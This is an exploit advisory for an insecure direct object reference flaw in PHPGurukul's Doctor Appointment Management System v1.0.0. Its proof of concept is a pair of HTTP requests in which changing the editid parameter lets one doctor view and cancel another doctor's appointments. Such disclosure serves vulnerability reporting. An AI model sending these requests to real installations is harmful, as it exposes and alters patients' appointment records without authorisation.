# Exploit Title: Doctor Appointment Management System - V 1.0.0 - Insecure Direct Object Reference(IDOR)
## Date: 1/4/2024
## Vendor Homepage: https://phpgurukul.com/doctor-appointment-management-system-using-php-and-mysql/
## Tested on: Debian Linux, Apache, Mysql
## Vendor: Phpgurukul
## Version: v1.0.0
## Exploit Description:
## Doctor Appointment Management System - V 1.0.0 suffers from IDOR - Broken Access Control Vulnerability allowing attacker doctor to look up and update the appointment that is managed by other doctor(horizontal privilege escalation).

## ---------------------------------POC-----------------------------
```
GET /dams/doctor/view-appointment-detail.php?editid=8(CHANGE HERE)&&aptid=154553066 HTTP/1.1
```

```
POST /dams/doctor/view-appointment-detail.php?editid=8(CHANGE HERE)&&aptid=154553066 HTTP/1.1
...

remark=hello&status=Cancelled&submit=
```